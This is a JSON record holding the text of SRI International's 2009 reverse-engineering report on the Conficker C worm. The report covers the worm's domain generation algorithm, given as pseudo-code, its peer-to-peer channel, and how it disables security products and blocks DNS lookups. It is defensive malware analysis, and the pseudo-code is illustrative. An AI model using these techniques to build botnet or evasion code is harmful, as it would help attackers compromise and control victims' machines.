{
    "id": "479e8a62-707d-4b1c-adac-80cb25a3332f",
    "created_at": "2023-01-12T15:07:07.131387Z",
    "updated_at": "2025-03-27T02:06:08.455938Z",
    "deleted_at": null,
    "sha1_hash": "fefc6706f8b254f670a3f367ff70a4a547bbe834",
    "title": "2009-03-08 - Conficker C Analysis",
    "authors": "",
    "file_creation_date": "2022-05-28T17:42:24Z",
    "file_modification_date": "2022-05-28T17:42:24Z",
    "file_size": 467025,
    "plain_text": "# An Analysis of Conficker C\n\n**[csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html)**\n\n## SRI International\n\nTechnical Report\n\n## Addendum\n\n Conficker C Analysis\n\nPhillip Porras, Hassen Saidi, and Vinod Yegneswaran\n\nhttp://mtc.sri.com/Conficker\n\nRelease Date: 08 March 2009\n\nLast Update:  4 APRIL 2009\n\n[NEW: Addendum -Conficker C P2P Reverse Engineering Report](http://www.csl.sri.com/users/vinod/papers/Conficker/P2P/index.html)\n\nNEW: FREE DETECTION UTILITIES\n\n[Conficker C P2P Snort Detection MOdule](http://www.csl.sri.com/users/vinod/papers/Conficker/contrib/plugin.html)\n\n[Conficker C Network Scanner](http://www.csl.sri.com/users/vinod/papers/Conficker/contrib/scanner.html)\n\nComputer Science Laboratory\n\nSRI International\n\n333 Ravenswood Avenue\n\nMenlo Park CA 94025 USA\n\n-- NOTICES -\nThis draft document represents an analysis in progress and is subject to\n\ncontinual enhancement, error correction, and improvement\n\n## Introduction\n\n\n-----\n\nThis addendum provides an evolving snapshot of our understanding of the latest Conficker variant,\nreferred to as Conficker C.  The variant was brought to the attention of the Conficker Working\nGroup when one member reported that a compromised Conficker B honeypot was updated with a\nnew dynamically linked library (DLL). Although a network trace for this infection is not available, we\nsuspect that this DLL may have propagated via Conficker's Internet rendezvous point mechanism\n[(Global Network Impact).  The infection was found on the morning of Friday, 6 March 2009 (PST),](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#sec-global-impact)\nand it was later reported that other working group members had received other DLL reinfections\nthroughout the same day.  Since that point, multiple members have reported upgrades of\npreviously infected machines to this latest variant via HTTP-based Internet rendezvous points. We\nbelieve this latest outbreak of Conficker variant C began first spreading at roughly 6 p.m. PST, 4\nMarch 2009 (5 March UTC).\n\nIn this addendum report, we summarize the inner workings and practical implications of this latest\nmalicious software application produced by the Conficker developers.  In addition to the dual\nlayers of packing and encryption used to protect A and B from reverse engineering, this latest\nvariant also cloaks its newest code segments, along with its latest functionality, under a significant\nlayer of code obfuscation to further hinder binary analysis.  Nevertheless, with a careful mixture of\nstatic and dynamic analysis, we attempt here to summarize the internal logic of Conficker C.\n\n## Implications of Variant C\n\nVariant C represents the third major revision of the Conficker malware family, which first appeared\non the Internet on 20 November 2008.  C distinguishes itself as a significant revision to Conficker\nB. In fact, we estimate that C leaves as little as 15% of the original B code base untouched, as\n[illustrated in Appendix 3, A Comparative Assessment of Conficker B and C Process Images.](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#Appendix_3_Compartive_Assessment_from_)\nWhereas the recently reported B++ variant represented a more surgical derivative of B, C\nincorporates a major restructuring of B's previous thread architecture and program logic, including\nmajor functional additions such as a new peer-to-peer (P2P) coordination channel, and a revision\nof the domain generation algorithm (DGA).  It is clear that the Conficker authors are well informed\nand are tracking efforts to eliminate the previous Conficker epidemics at the host and Internet\ngovernance level. In Conficker C, they have now responded with many of their own\ncountermeasures to thwart these latest defenses.\n\nFor example, C's latest revision of Conficker's now well-known Internet rendezvous logic may\nrepresent a direct retort to the action of the Conficker Cabal, which recently blocked all domain\nregistrations associated with the A and B strains.  C now selects its rendezvous points from a pool\nof over 50,000 randomly generated domain name candidates each day.  C further increases\nConficker's top-level domain (TLD) spread from five TLDs in Conficker A, to eight TLDs in B, to 110\nTLDs that must now be involved in coordination efforts to track and block C's potential DNS\nqueries.  With this latest escalation in domain space manipulation, C not only represents a\nsignificant challenge to those hoping to track its census, but highlights some weaknesses in the\nlong-term viability of how Internet address and name space governance is conducted.\n\n\n-----\n\nOne interesting and minimally explored aspect of Conficker is its early and sophisticated adoption\nof binary encryption, digital signatures, and advanced hash algorithms to prevent third-party\nhijacking of the infected population.  At its core, the main purpose of Conficker is to provide the\nauthors with a secure binary updating service that effectively allows them instant control of millions\nof PCs worldwide.  Through the use of these binary encryption methods, Conficker's authors have\ntaken care to ensure that other groups cannot upload arbitrary binaries to their infected drone\npopulation, and these protections cover all Conficker updating services: Internet rendezvous point\ndownloads, buffer overflow re-exploitation, and the latest P2P control protocol.\n\nIn evaluating this mechanism, we find that the Conficker authors have devised a sophisticated\nencryption protocol that is generally robust to direct attack. All three crypto-systems employed by\nConficker's authors (RC4, RSA, and MD-6) also have one underlying commonality. They were all\nproduced by Dr. Ron Rivest of MIT. Furthermore, the use of MD-6 is a particularly unusual\nalgorithm selection, as it represents the latest encryption hash algorithm produced to date. The\ndiscovery of MD-6 in Conficker B is indeed highly unusual given Conficker's own development time\nline. We date the creation of Conficker A to have occurred in October 2008, roughly the same time\nframe that MD-6 had been publicly released by Dr. Rivest (see http://groups.csail.mit.edu/cis/md6).\nWhile A employed SHA-1, we can now confirm that MD-6 had been integrated into Conficker B\nby late December 2008 (i.e., the authors chose to incorporate a hash algorithm that had literally\nbeen made publicly available only a few weeks earlier).\n\nUnfortunately for the Conficker authors, by mid-January, Dr. Rivestâ€™s group submitted a revised\nversion of the MD-6 algorithm, as a buffer overflow had been discovered in its implementation.\nThis revision was inserted quietly, followed later by a more visible public announcement of the\nbuffer overflow on 19 February 2009, with the release of the Fortify report\n(http://blog.fortify.com/repo/Fortify-SHA-3-Report.pdf). We confirmed that this buffer overflow was\npresent in the Conficker B implementations. However, we also confirmed that this buffer overflow\nwas not exploitable as a means to take control of Conficker hosts.  Nevertheless, the Conficker\ndevelopers were obviously aware of these developments, as they have now repaired their MD-6\nimplementation in Conficker C, using the identical fix made by Dr. Rivest's group. Clearly the\nauthors are aware of, and adept at understanding and incorporating, the latest cryptographic\nadvances, and are actively monitoring the latest developments in this community.\n\nOne major implication from the Conficker B and C variants, as well as other now recently emerging\nmalware families, is the sophistication with which they are able to terminate, disable, reconfigure,\nor blackhole native operating system (OS) and third-party security services.  We provide an in[depth analysis of Conficker's Security Product Disablement logic, to help illustrate the](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#SecurityProductDisablement)\ncomprehensive challenge that modern malware poses to security products, and to Microsoft's antimalware efforts.  Conficker offers a nice illustration of the degree to which security vendors are\nbeing actively challenged to not just hunt for malicious logic, but to defend their own availability,\nintegrity, and the network connectivity vital to providing them a continual flow of the latest malware\nthreat intelligence.\n\n\n-----\n\nPerhaps the most obvious frightening aspect of Conficker C is its clear potential to do harm.\nAmong the long history of malware epidemics, very few can claim sustained worldwide infiltration\nof multiple millions of infected drones.  Perhaps in the best case, Conficker may be used as a\nsustained and profitable platform for massive Internet fraud and theft. In the worst case, Conficker\ncould be turned into a powerful offensive weapon for performing concerted information warfare\nattacks that could disrupt not just countries, but the Internet itself.\n\nFinally, we must also acknowledge the multiple skill sets that are revealed within the evolving\ndesign and implementation of Conficker. Those responsible for this outbreak have demonstrated\nInternet-wide programming skills, advanced cryptographic skills, custom dual-layer code packing\nand code obfuscation skills, and in-depth knowledge of Windows internals and security products.\nThey are among the first to introduce the Internet rendezvous point scheme, and have now\nintegrated a sophisticated P2P protocol that does not require an embedded peer list. They have\ncontinually seeded the Internet with new MD5 variants, and have adapted their code base to\naddress the latest attempts to thwart Conficker.  They have infiltrated government sites, military\nnetworks, home PCs, critical infrastructure, small networks, and universities, around the world.\nPerhaps an even greater threat than what they have done so far, is what they have learned and\nwhat they will build next.\n\n## Conficker C Overview\n\n[Figure 1 illustrates the Conficker C program structure and logic.  When initialized, the DLL](http://public.mtc.sri.com/Conficker/addendumC/index2.html#fig-D-Overview)\nperforms its setup logic, similar to that of A and B, with extensions.  At initialization, it checks for\nthe presence of three mutex values on the target host to avoid reinfection. If absent, these three\nmutexes are created: 1) the mutex name \"Global\\<string>-7\"; 2) the mutex name \"Global\\\n<string>-99; and 3) a mutex named pseudo-randomly generated based on the process ID. The\n<string> in the first two mutex is unique per computer name; it is calculated based on the crc32\nhash of the computer name and XOR'ed with a constant. C then installs several in-memory\npatches to DLLs, and embeds other mechanisms to thwart security applications that would\notherwise detect its presence.\n\nC modifies the host domain name service (DNS) APIs to block various security-related network\n[connections (Domain Lookup Prevention), and installs a pseudo-patch to repair the 445/TCP](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#dns-prevention)\n[vulnerability, while maintaining a backdoor for reinfection (Local Host Patch Logic). This pseudo](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#sec-pseudo-path)\npatch protects the host from buffer overflows by sources other than those performed by the\nConficker authors or their infected peers.\n\nLike Conficker B, C incorporates logic to defend itself from security products that would otherwise\nattempt to detect and remove it.   C spawns a security [product disablement thread. This thread](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#service-disablement)\ndisables critical host security services, such as Windows defender, as well as Windows services\nthat deliver security patches and software updates. These changes effectively prevent the victim\nhost from receiving automated software updates. The thread disables security update notifications\n\n\n-----\n\nand deactivates safeboot mode as a future reboot option. This first thread then spawns a new\n[security process termination thread, which continually monitors for and kills processes whose](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#process-termination)\nnames match a blacklisted set of 23 security products, hot fixes, and security diagnosis tools.\n\nFigure 1: Overview of Conficker C\n\n\n-----\n\nConficker C installs itself into the user file system and configures the registry appropriately to\ninvoke its DLL at host startup.  It also inserts a variety of extraneous registry keys that are\nsubsequently unused, presumably to cloak its presence (Obfuscating C's Installation and Its\nPresence).  It copies itself into a randomly named DLL located in either the System32 directory,\nprogram files directory, or the user's temporary files folder.  It deletes all restore points prior to its\ninfection to thwart rollback. C then performs a simple validation of its DLL size, and suicides if this\ncheck fails. It sets the DLL's date to the same date as the local kernel32.dll, and sets NT File\nSystem (NTFS) file permissions on its stored file image to prevent write and delete privileges.\nOnce installed, the DLL spawns a remote thread, which it attaches to the netsvcs.exe or\nsvchost.exe process, depending on the OS version.\n\nThe core elements of Conficker C are incorporated into two threads: a P2P communication\nthread, and the domain generation and Internet rendezvous point thread. The first thread is\nembodied in a code segment that has undergone an additional layer of code obfuscation,\nsuggesting a desire by the Conficker authors to hinder its analysis, and thereby providing an\n[obvious point for in depth inspection.  We describe the P2P protocol in Peer to Peer Logic.  The](http://public.mtc.sri.com/Conficker/addendumC/index2.html#peer-to-peer)\nP2P protocol includes an ability to coordinate with peers over TCP and UDP channels, as well as\ndownload and run digitally signed Win32 binaries.  Incorporated with the P2P thread is antitracing logic that will kill the Conficker C process when run under a debugger. This logic was\nremoved for this analysis. Conficker C also incorporates an HTTP date check function, which is\n[discussed within Peer to Peer Logic.](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#peer-to-peer)\n\nFinally, C introduces a substantial modification of the DGA and query procedure, discussed in\n[Domain Generation Algorithm.  The DGA will be activated on 1 April 2009, and before April 1st it](http://public.mtc.sri.com/Conficker/addendumC/index2.html#domain-generation-algorithm)\nwill enter a loop that sleeps 24 hours and then rechecks the date via getlocaltime.  Prior to\nentering the April 1st date check, C will sleep for an initial random interval between 30 and 90\nminutes. More specifically, this sleep interval is between 30 and 90 minutes if the local hour is\nafter 11 a.m. and before 7 a.m. If the local time is after 8 a.m. and before 11 a.m., the sleep period\nwill be between 2.5 and 3.5 hours. It will then check for Internet connectivity, and if connected will\nenter the domain generation logic.  The next section describes this logic in greater detail.\n\n## Domain Generation Algorithm\n\n[The domain generation algorithm and query procedure (Figure 2) have been significantly modified](http://public.mtc.sri.com/Conficker/addendumC/dga-code)\nfrom previous versions of Conficker. Among the potential motivations for these changes may be to\naddress the recent actions of the Conficker Cabal, as it has moved to block future registrations of\nConficker A and B domains. Among the key changes, Conficker C increases the number of daily\ndomain names generated, from 250 to 50,000 potential Internet rendezvous points.  Of these\n50,000 domains, only 500 are queried, and unlike previous versions, they are queried only once\nper day.\n\nFurthermore, C provides significantly more filtering of the IP addresses produced by the DNS\nqueries. The IP address is rejected if\n\n1. it was associated with a query that returned more than one IP address\n\n\n-----\n\n2. it is 127.0.0.1 (localhost) or other trivial address\n[3. it matches an address with an internal blacklist (see Appendix 2 for the full blacklist)](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#Appendix_2_Domain_Generator_Filtered)\n4. another DNS query had previously returned the identical IP.  Note, if an organization\n\nchooses to register and resolve multiple Conficker C domains to a single IP address, Cinfected machines will not contact that IP more than one time\n\nIf none of the domains are alive and ready to serve a digitally signed payload, C will sleep for 24\nhours, and then will generate a new list of 50,000 domains.  The algorithm produces a domain\nname set that is independent of Conficker A and B, and will overlap these other domain sets only\nin a rare coincidence.  The name of each generated domain is 4 to 10 characters, to which a\nrandomly selected TLD is appended from the following list of 116 suffix (mapping to 110 TLDs):\n\n[ \"ac\", \"ae\", \"ag\", \"am\", \"as\", \"at\", \"be\", \"bo\", \"bz\", \"ca\", \"cd\", \"ch\", \"cl\", \"cn\", \"co.cr\", \"co.id\"\n, \"co.il\", \"co.ke\", \"co.kr\", \"co.nz\", \"co.ug\", \"co.uk\", \"co.vi\", \"co.za\", \"com.ag\", \"com.ai\",\n\"com.ar\", \"com.bo\", \"com.br\", \"com.bs\", \"com.co\", \"com.do\", \"com.fj\", \"com.gh\", \"com.gl\",\n\"com.gt\", \"com.hn\", \"com.jm\", \"com.ki\", \"com.lc\", \"com.mt\", \"com.mx\", \"com.ng\", \"com.ni\",\n\"com.pa\", \"com.pe\", \"com.pr\", \"com.pt\", \"com.py\", \"com.sv\", \"com.tr\", \"com.tt\", \"com.tw\",\n\"com.ua\", \"com.uy\", \"com.ve\", \"cx\", \"cz\", \"dj\", \"dk\", \"dm\", \"ec\", \"es\", \"fm\", \"fr\", \"gd\", \"gr\",\n\"gs\", \"gy\", \"hk\", \"hn\", \"ht\", \"hu\", \"ie\", \"im\", \"in\", \"ir\", \"is\", \"kn\", \"kz\", \"la\", \"lc\", \"li\", \"lu\", \"lv\",\n\"ly\", \"md\", \"me\", \"mn\", \"ms\", \"mu\", \"mw\", \"my\", \"nf\", \"nl\", \"no\", \"pe\", \"pk\", \"pl\", \"ps\", \"ro\",\n\"ru\", \"sc\", \"sg\", \"sh\", \"sk\", \"su\", \"tc\", \"tj\", \"tl\", \"tn\", \"to\", \"tw\", \"us\", \"vc\", \"vn\" ]\n\n\n01:\n02:\n03:\n04:\n05:\n06:\n07:\n08:\n09:\n10:\n11:\n11:\n12:\n13:\n14:\n15:\n16:\n17:\n18:\n19:\n20:\n21:\n22:\n23:\n24:\n25:\n26:\n27:\n\n\nintdomain_name_generation()\n{\n_// local declarations_\nhMem = 0;\ncheck_if_MS_DEF_PROV();\nget_time_from_popular_web_sites();\n_// baidu.com, google.com, yahoo.com, ask.com, w3.org,_\n_// facebook.com, imageshack.us, rapidshare.com_\n\nhMem = GlobalAlloc(0x40u, 0x30D40u); // global array - 50,000 random names\n**if ( hMem )**\n{\n**while ( 1 )**\n{\ncounter_domains = counter;\n**if ( counter >= 50000 )**\n**break;**\n\nsize_of_name = DGA_random_function() % 6 + 4;\n\n\n-----\n\n28:\n29:\n30:\n31:\n32:\n33:\n34:\n35:\n36:\n37:\n38:\n39:\n40:\n41:\n42:\n43:\n44:\n45:\n46:\n47:\n48:\n49:\n50:\n51:\n52:\n53:\n54:\n55:\n56:\n57:\n58:\n59:\n60:\n61:\n62:\n63:\n64:\n65:\n66:\n67:\n68:\n69:\n70:\n71:\n72:\n73:\n74:\n75:\n76:\n77:\n78:\n79:\n80:\n\n\nrandom DGA_random_function();\nstrcat(domainname, TLD-suffix[random num % 116] );\n_// append 1 of 116 suffixes (from 110 TLDs) to domain name_\n++counter;\n}\n\n_// select and query 500 domains_\ncounter_domains = 0;\n**while ( !success_download && counter_domains < 500 )**\n{\n_// random number modulo 50,000_\none_in_50000_names = conficker_D_PRNG_function() % 50,000);\nhostent = gethostbyname(one_in_50000_names);\n\n**if ( hostent )**\n{\nhost_address = hostent->address_list; // get list of IPs\narray_previously_checked_IPs[counter_domains] = host_address;\n\n**if ( *host_address )**\n{\n_// skip if domain name resolves to multiple IP addresses_\n**if ( !*(host_address + 1) )**\n{\n_// skip if IP is local host or other trivial IPs_\n**if ( check_IP_value(host_address) )**\n{\nis_blacklisted_ip = check_if_IP_is_in_ranges(host_address);\n_// skip if IP is blacklisted_\n**if ( ! is_blacklisted_ip )**\n{\nfound = 0;\nindex = 0;\n**while (index < counter_domains )**\n{\n**if (host_address == array_previously_checked_IPs[index] )**\n{\nfound = 1;\n**break; // break if IP has been previously encountered**\n}\n++index;\n}\n_// skip if IP has been previously encountered_\n**if ( !found )**\n{\nsnprintf(Dest, 0x80u, \"http://%s\", host_address);\nsuccess_download = download_and_validate_file(Dest);\n_// HTTP request to the domain and download valid file_\n}\n}\n}\n\n}\n\n\n-----\n\n}\n}\nSleep(...); // sleep small random amount\n++counter_domains;\n}\n}\nGlobalFree(hMem);\n**return success_download;**\n}\n\nFigure 2: Domain generation pseudo-code\n\nTo resolve the set of domain names to IP addresses, C uses the standard Windows\ngethostbyname API. If the queried domain produces an IP address that passes C's 4-step filtering\ntest, it will attempt to contact the IP address using port 80/TCP. Here it uses a single call to the\nHttpQueryInfo API (i.e., an empty HTTP Get request). If it succeeds in connecting to an authentic\nConficker rendezvous point, the server will immediately send a digitally signed Win32 executable\nfor the client to execute.  This variant does not produce the well-known Conficker search URL\nstring (with q= or aq=). Rather, the empty HTTP request may prove more difficult for IDS and\nnetwork forensic signatures to identify.\n\nVariant C cycles through its domain query loop once per 24 hour period, whereas A cycled through\nits domain list every 3 hours, and B cycled every 2 hours. In runtime testing of the domain\ngeneration algorithm, infected clients may take over 4 hours to complete the full 500-set of daily\ndomain queries.\n\nAnother noticeable difference between variants A/B/B++ and the new C variant is that the new\nvariant incorporates a 300-second timeout interval on the downloaded session.  If the binary take\nmore time than this to download, the session is terminated. There is also a file size limit imposed\nby C of 512 Kbs.  If this download size is reached before completion, then the routine is exited.\nHowever, even when the binary download is stopped prematurely, the digital signature is still\nchecked.  If C succeeds in downloading a valid Win32 executable, the domain generation\nalgorithm's main thread sleeps for 4 days, and then resume generating and contacting domains.\n\nOnce the file has been downloaded, C validates the digital signature of the binary, and spawns this\nexecutable via ShellExecute, as discussed for Conficker A and B (Binary Download and\nValidation).\n\n## Peer-to-Peer Logic\n\nConficker C introduces yet another mechanism to coordinate infected hosts. This new\ncoordination strategy employs a P2P protocol, and the Conficker authors have taken some care to\nhinder its analysis through code obfuscation. They have also obfuscated the logic that implements\nP2P binary download validation, HTTP date checking, anti-debugger segments, and other logic. In\nparticular, within the P2P segments, the authors have attempted to impede the identification of\n\n\n-----\n\nWindows API calls, and have applied other code obfuscation to hinder analysis. Appendix 5, API\nRecovery Table, includes the mapping of obfuscated APIs to code offsets, which were recovered\nfrom our analysis.\n\nAlso integrated within the broader P2P program logic are other obfuscated code segments, for\nexample, those code segments dedicated to establishing HTTP server communications on a\nConficker-infected host, peer scan logic, and filesharing logic for both client- and server-side\nsharing.\n\n### P2P Setup Logic\n\nUpon entry to the P2P main thread, Conficker C dynamically computes an in-memory import table,\nwhich contains the list of obfuscated APIs.  C next sets various registry entries and creates a\ndedicated working directory for use by the P2P service. It will then use the standard Microsoft\nCrypto Library for random number generation. These steps are the setup for the actual P2P logic.\n\nC creates a directory in the Windows (OS dependent) standard default temporary file directory,\nunder the name:  C:\\...\\Temp\\{%08X-%04X-%04X-%04X-%08X%04X}. This directory is used by\nC's P2P service to store downloaded payload, and as writing space for storing other information.\nConficker also creates a registry entry that corresponds to C's scratch directory:\n\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\{%08X-%04X-%04X-%04X%08X%04X}\n\nThe infected node is capable of acting like a server. In this mode it will interact with the Conficker\nP2P network and distribute digitally signed files to other P2P clients.  It can operate in this mode\nwhen it has determined that it has a locally stored binary in its P2P temporary directory, and this\nfile has been properly digitally signed by the Conficker authors and is unaltered (i.e., properly\nhashed and signed).\n\n### Internet Date Check\n\nBefore proceeding to the main P2P logic, C contacts a list of known web sites to acquire the\ncurrent date and time. C incorporates a set of embedded domain names, from which it selects a\nsubset of multiple entries from this list. It performs DNS lookups of this subset list, and it filters\neach returned IP address against the same list of blacklist IP address ranges used by the domain\n[generation algorithm (see Appendix 2).  If the IP does not match the blacklist, C connects to the](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#Appendix_2_Domain_Generator_Filtered)\nsite's port 80/TCP, and sends an empty URL GET header, for example\n\ncontents.192.168.1.1.40.1143-195.81.196.224.80\n\nGET / HTTP/1.1\n\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-ms-xbap, */*\n\nAccept-Language: en-US\n\nUA-CPU: x86\n\nAccept-Encoding: gzip, deflate\n\n\n-----\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.0)\nHost: tuenti.com\nConnection: Keep-Alive\n\nIn response, the site returns a standard URL header that incorporates a date and time stamp.  C\nthen parses this information to set its internal system time. The following web sites are consulted\nby C's Internet date check:\n\n[4shared.com, adobe.com, allegro.pl, ameblo.jp, answers.com, aweber.com, badongo.com,\nbaidu.com, bbc.co.uk, blogfa.com, clicksor.com,comcast.net, cricinfo.com, disney.go.com,\nebay.co.uk, facebook.com, fastclick.com, friendster.com, imdb.com, megaporn.com,\nmegaupload.com, miniclip.com, mininova.org, ning.com, photobucket.com, rapidshare.com,\nreference.com, seznam.cz, soso.com, studiverzeichnis.com, tianya.cn, torrentz.com,\ntribalfusion.com, tube8.com, tuenti.com, typepad.com, ucoz.ru, veoh.com, vkontakte.ru,\nwikimedia.org, wordpress.com, xnxx.com, yahoo.com, youtube.com]\n\n### Searching for Peers\n\nConficker C peers can act simultaneously as both P2P clients and servers. To enable this\ninteraction, C opens 2 UDP server (listen) ports and two TCP server (listen) ports. One or two\nadditional UDP \"client\" ports may be employed. File transfers can occur in both directions, i.e.,\nclients can \"pull\" and servers can \"receive\" files. The P2P logic of Conficker C is spread through a\nset of threads to support its scanning for peers as well as the reception of digitally signed\npayloads. The main thread spawns a set of seven additional threads that are designed to\norchestrate Conficker's P2P traffic, illustrated in [Figure 3.](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#fig-named-p2p-thread)\n\n\n-----\n\nFigure 3: P2P main thread overview\n\nThe main P2P thread starts by spawning five threads. The first thread sets the system time using\na call to InternetTimeToSystemTime based on a connection to one of the popular Internet portals,\nlisted above. Two additional threads listen on TCP ports and serve as a mechanism for\ndistributing the payload to other Conficker peers. If a legitimate Conficker C peer requests the\npayload, it is delivered by spawning a separate thread.  Finally, two additional threads coordinate\noutbound UDP scanning for Conficker peers.\n\nOnce these threads are started, C enters a wait mode for any incoming connection. In response to\na TCP connection request, it spawns a thread to receive a digitally signed payload. The signature\ncheck and file validation are performed in a separate thread. Immediately after spawning the\nthread and checking the signature, C starts a different thread, which uses UDP to advertise that it\nis a Conficker node that has a digitally signed payload.  When scanning, C avoids certain IP\nranges (including certain assigned /8 netblocks).  The /8s not scanned by the P2P protocol are 0,\n1, 2, 5, 10, 14, 23, 27, 31, 36, 37, 39, 42, 46, 49, 50, 100, 101, 102, 103, 104, 105, 106, 107, 108,\n109, 127, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 191, 197, and 223 - 255.\n\nAn incoming connection is first checked to validate whether the source IP address matches a\n[pattern similar to the IP validations used by the Domain Generation Algorithm. This includes the](http://public.mtc.sri.com/Conficker/addendumC/domain-generation-algorithm)\ncheck to ensure that an IP address does not belong to the list of blacklisted ranges (see Appendix\n2). These checks occur every time a random peer address is generated inside the UDP scan\nthread. A similar check is used to ensure that the digitally signed payload is not delivered through\nthe TCP channel when a remote host requests it.\n\nThere is a unique mapping from IP address to the two TCP and UDP listen ports in each host. This\nhelps C avoid the need for supernodes or a peer list (i.e., C requires no embedded hitlist to locate\n[peers). This is an important departure from previous malware strains, such as Storm Worm [4]. It](http://www.csl.sri.com/users/porras/addendum/ref-4)\n\n\n-----\n\ncan simply scan the Internet looking for other peers that might be listening, and from this scanning\nbootstrap itself into Conficker's P2P network. However, it is possible that there may in fact be an\nembedded seedlist as has been suggested by other researchers (neither method precludes the\nother).\n\n### TCP/UDP P2P Protocol\n\nOur effort to understand and reconstruct the inner workings of the P2P protocol's messaging\nscheme is an ongoing activity. Currently, we have uncovered several interesting aspects of the\nP2P behavior based on observing traffic sent to TCP and UDP listen ports on infected hosts.\n\nWith respect to the TCP-based communication channel, we have identified certain segments of\nthe TCP payload. In particular, the first two bytes appear to form a header. They correspond to\nthe length of the TCP payload - 2 (size of the header).\n\n[The UDP-based communications channel employs datagram sizes that are variable. In Figure 4,](http://www.csl.sri.com/users/porras/addendum/index.html#fig-udp-datagram-distro)\nwe plot the distribution of the datagram sizes of the UDP PING packet, and it appears to follow a\npower-law distribution with a minimum value of 20 bytes. C will also produce a handful of 4-byte\npackets. In some cases, the UDP activity appears to be a precursor (i.e., a setup) to the TCP\nactivity. There could be several reasons for this, such as the UDP channel providing negotiations\nsuch as key exchange prior to TCP data exchanges.\n\n\n-----\n\nFigure 4: Datagram size distribution for UDP PING packets\n\nCertain byte sequences of the UDP packets seem predictable. For example, an entropy\n[calculation of byte 20 (UDP) is shown in Figure 5.  The graph illustrates that certain values are](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#fig-bytes)\nmore common than others in the UDP PING packets. High frequency values include 0, 1, 4 (100),\n5 (101), 16(10000), 17(10001), 20(10100), 21(10101), 64(100000), 65(100001), 68(100100),\n69(100101), 80(101000) and 81(101001), suggesting that bits 0,2,5 and 6 are important.\n\nFigure 5: P2P byte sequence distribution for UDP PING packets\n\n### P2P File Download Logic\n\n\n-----\n\nAmong its central functions, the P2P protocol provides the Conficker overlay network with a secure\npeer-based file sharing service.  As discussed previously, drones infected with C can operate as\nboth client and server with the P2P network.  A drone may operate as a server when its TCP\nserver thread detects that its local temporary storage directory contains a local file that has been\ndigitally signed; a separate embedded P2P public key is used make this validation. If a valid\ndigitally signed file is available, the drone may distribute this file to other peers.\n\nCurrently, it appears that the TCP channel is the preferred connection through which file sharing is\nconducted. A file downloaded by a client is subject to digital signature validation, and if passed the\nfile will be stored in the local temporary storage directory, thus enabling the server thread to\npropagate the binary during future peer exchanges.   Registry keys are modified to enable\nautorun of downloaded content.\n\n## Local Host Patch Logic\n\nAs part of their initialization procedure, all Conficker variants will perform in-memory alterations of\ncertain standard Windows API's.  Briefly, all versions of Conficker (A/B/B++/C) patch the\nNetpwPatchCanonicalize API from netapi32.dll, DnsQuery from dnsapi.dll, SendTo from\ndnsrslvr.dll, and NtQueryInformationProcess (for thread obfuscation) from ntdll.dll.  The allows\nNetpwPatchCanonicalize Conficker to protect its host from other malware that would attempt to\nreexploit the MS08-067 buffer overflow, while still allowing reinfection from other Conficker hosts\n(see [Extensions to Conficker's netapi32.dll Patch for more details).  DnsQuery patching allows](http://mtc.sri.com/Conficker/)\nConficker to suppress connections to security companies (and researcher websites), that may\npatch and install tools that would otherwise remove Conficker from the host (see Domain Lookup\nPrevention).\n\nIn B++ NetpwPathCanonicalize has been patched to allow the buffer overflow to deliver a URL\nfrom which a signed binary can be pulled. In C, this path has been abandoned in favor of the P2P\nmechanism, and the patch that C applies is more similar to the one applied to B-infected hosts.\n\nIn C, InternetGetConnectedState has been added to the list of in-memory patched APIs. The patch\nconsists of making sure that InternetGetConnectedState is invoked by Conficker code or a module\nthat has been loaded by the calling process. If this is not the case, the main thread exits.\n\n## Security Product Disablement\n\nConficker C incorporates a variety of strategies to secure and defend its installation on the victim\nhost. To do this, C employs several measures to cloak its presence, as well as measures to kill or\ndisable security products that would otherwise detect its presence.  C's assault on security\nproducts begins right away, just after its mutex checks (to detect new installs from reinfections). At\neach process initialization, it performs an in-memory patch of the host's DNS resolution services to\n[prevent domain lookups to a variety of security product (and research) sites.  C then spawns a](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#dns-prevention)\n\n\n-----\n\n[separate thread to halt and disable security and update services, and then enters an infinite loop.](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#service-disablement)\n[There, it continually searches for and terminates active security products and patches.  These](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#process-termination)\nsteps are performed each time C is invoked.\n\n[Upon first installation, C installs itself and obfuscates its presence on the victim's host,. These](http://public.mtc.sri.com/Conficker/addendumC/install-obfuscate)\nsteps allow it to avoid easy diagnosis and removal by an attentive user. It deletes all restore points\nprior to its infection to thwart rollback, and sets NTFS file permissions on its stored file image to\nprevent write and delete privileges. Most of this logic also appeared in prior version, but here we\nfind some extensions and updates.\n\n[C also incorporates logic to disable Windows' firewall protection of certain high-order UDP and](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#firewall-disablement)\nTCP ports. These firewall adjustments are not performed at initialization, but rather occur when C\nenters its network communication logic.\n\n### Domain Lookup Prevention\n\nAt each process initialization, Conficker C applies an in-memory patch to dnsapi.dll (Windows XP,\n2K) or dnsrslvr.dll (Vista).  It does not patch the DLL files on the filesystem, only their in-memory\ninstances. These DLLs contain the standard Windows APIs for domain name resolution and\ncaching. Conficker modifies Window's DNS lookup and cache services to prevent successful\ncommunications with various security product vendors and research sites. The list of blocked\n[domain lookups is shown in Table 1.](http://www.csl.sri.com/users/vinod/papers/Conficker/addendumC/index.html#table-1-patched-DNS)\n\nvet. freeav rising unlocker\n\nsans. free-av removal 